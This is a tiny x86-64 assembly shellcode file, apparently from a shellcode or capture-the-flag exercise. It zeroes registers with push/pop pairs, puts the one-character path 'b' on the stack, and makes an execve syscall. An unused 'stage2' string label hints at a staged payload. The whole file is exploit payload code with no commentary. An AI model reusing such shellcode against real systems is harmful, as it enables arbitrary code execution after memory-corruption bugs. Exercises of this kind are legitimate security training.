.global _start
.intel_syntax noprefix

_start:
  push rax
  pop rsi

  push rsi
  pop rdx

  push rdx
  pop rax

  mov al, 59
  push 0x62
  mov rdi, rsp
  syscall

filename:
  .ascii "stage2"
